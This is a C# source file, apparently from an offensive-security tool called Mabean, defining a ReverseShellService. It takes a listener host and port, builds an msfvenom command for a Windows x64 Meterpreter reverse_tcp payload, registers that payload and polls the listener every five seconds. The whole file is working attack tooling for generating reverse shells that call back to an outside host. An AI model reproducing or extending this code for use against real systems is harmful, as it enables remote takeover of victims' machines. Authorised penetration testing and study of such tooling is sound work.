using Mabean.Models;
using System;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Mabean.Services
{
    public class ReverseShellService : IDisposable
    {
        private readonly PayloadService _payloadService;
        private Timer? _pollTimer;

        public string LHost { get; private set; } = "";
        public string LPort { get; private set; } = "";
        public ReverseShellStatus Status { get; private set; } = ReverseShellStatus.Unconfigured;

        public event Action? StatusChanged;

        public ReverseShellService(PayloadService payloadService)
        {
            _payloadService = payloadService;
        }

        public async Task ConfigureAsync(string lhost, string lport)
        {
            LHost = lhost;
            LPort = lport;

            var command = BuildMsfvenomCommand(lhost, lport);
            await _payloadService.AddPayload(command, $"reverse-shell-{lhost}-{lport}");

            _pollTimer?.Dispose();
            _pollTimer = new Timer(async _ => await CheckAvailabilityAsync(), null,
                TimeSpan.Zero, TimeSpan.FromSeconds(5));
        }

        public async Task CheckAvailabilityAsync()
        {
            if (string.IsNullOrWhiteSpace(LHost) || string.IsNullOrWhiteSpace(LPort))
            {
                SetStatus(ReverseShellStatus.Unconfigured);
                return;
            }

            if (!int.TryParse(LPort, out int port))
            {
                SetStatus(ReverseShellStatus.Unavailable);
                return;
            }

            try
            {
                using var client = new TcpClient();
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(3));
                await client.ConnectAsync(LHost, port, cts.Token);
                SetStatus(ReverseShellStatus.Available);
            }
            catch
            {
                SetStatus(ReverseShellStatus.Unavailable);
            }
        }

        private void SetStatus(ReverseShellStatus status)
        {
            if (Status == status) return;
            Status = status;
            StatusChanged?.Invoke();
        }

        private static string BuildMsfvenomCommand(string lhost, string lport)
        {
            return $"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw";
        }

        public void Dispose()
        {
            _pollTimer?.Dispose();
        }
    }
}
